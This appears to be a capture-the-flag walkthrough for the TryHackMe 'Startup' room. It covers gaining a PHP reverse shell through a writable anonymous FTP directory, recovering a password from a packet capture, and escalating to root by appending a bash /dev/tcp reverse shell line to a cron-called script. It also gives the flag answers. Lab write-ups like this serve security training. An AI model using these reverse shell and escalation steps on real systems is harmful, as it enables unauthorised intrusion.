# Startup
https://tryhackme.com/room/startup

## Enumeration
nmap scan output:
```
21/tcp open  ftp     syn-ack vsftpd 3.0.3
    Anonymous FTP login allowed (writable)
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
```

Gobuster directories:
/files:
    ftp/    (Executable files here)
    important.jpg
    notice.txt

Notes:
- user "maya" (exposed by notice.txt)
- ftp anonymous login allowed
- ftp directory is reachable via web server - potential reverse shell

Anonymous Login worked correctly & reverse php shell uploaded & executed in ftp/ dir

Now we have access to the www-data user I used linpeas.sh to scan the target for potential escalation.

##  What is the secret spicy soup recipe? 
Looking at the "/" directory there is a file called recipe.txt that contains the message 
```
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

Answer: love

## What are the contents of user.txt?
In the linpeas output under _Unexpected in root_ there are a few directories, however the one that attracts focus is /incidents this contains a pcapng file called "suspicious.pcapng" so I copied this to the ftp directory on the web server and downloaded it.

Within this packet capture we can see someone trying to access a webshell
`GET /files/ftp/shell.php`

If we follow this TCP stream and contionue though we can see the usage of this web shell.
The other hacker has his password and is trying to use `sudo -l` then sending the password across for the lennie user.

Username: lennie
Password: c4ntg3t3n0ughsp1c3

I used this to log in via ssh and then cat the user.txt file for the first flag

Answer: THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

## What are the contents of root.txt?
Now I'm on the lennie user I'm going to re run the linpeas script.

Under "Interesting writable files owned by me or writable by everyone"
there's /etc/print.sh which is called in /home/lennie/scripts/planner.sh

I'm assuming that this file has been setup in a crontab somewhere so I add the following to the file to create a reverse shell:
`bash -i >& /dev/tcp/<ip>/4444 0>&1`

I then cat /root/root.txt

Answer: THM{f963aaa6a430f210222158ae15c3d76d}
